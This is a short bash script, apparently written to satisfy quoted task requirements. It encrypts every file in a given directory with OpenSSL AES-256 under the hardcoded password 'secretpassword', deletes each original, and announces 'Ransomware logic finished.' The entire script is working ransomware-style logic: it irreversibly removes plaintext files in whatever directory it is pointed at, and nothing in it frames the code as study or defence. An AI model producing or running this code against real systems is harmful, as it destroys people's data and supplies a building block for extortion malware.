#!/bin/bash

# Parse arguments: Target Directory and Number of Files
TARGET_DIR=$1
NUM_FILES=$2

# Validate arguments
if [ -z "$TARGET_DIR" ]; then
    echo "Usage: $0 <target_directory> [num_files]"
    exit 1
fi

# Create directory if it doesn't exist
mkdir -p "$TARGET_DIR"

# --- 1. GENERATE FILES ---
# "The script must also support generating a large volume of files on demand" 
if [ ! -z "$NUM_FILES" ]; then
    echo "Creating $NUM_FILES files in $TARGET_DIR..."
    for ((i=1; i<=NUM_FILES; i++)); do
        # Create a file with some dummy content
        echo "This is important data for file $i" > "$TARGET_DIR/file_$i.txt"
    done
fi

# --- 2. ENCRYPT FILES ---
# "generate corresponding encrypted versions of those files" 
echo "Starting encryption..."
# Loop through files in the target directory
for file in "$TARGET_DIR"/*; do
    # Skip directories and already encrypted files
    if [[ -d "$file" ]] || [[ "$file" == *.enc ]]; then
        continue
    fi

    echo "Encrypting $file..."
    # Encrypt using OpenSSL (AES-256) 
    # -pbkdf2 is used for better security, -salt adds randomness
    openssl enc -aes-256-cbc -salt -pbkdf2 -in "$file" -out "${file}.enc" -k "secretpassword"

    # --- 3. DELETE ORIGINALS ---
    # "delete the original, unencrypted files once encryption has completed" 
    if [ $? -eq 0 ]; then
        rm "$file"
        echo "Encrypted and deleted original: $file"
    else
        echo "Encryption failed for $file"
    fi
done

echo "Ransomware logic finished."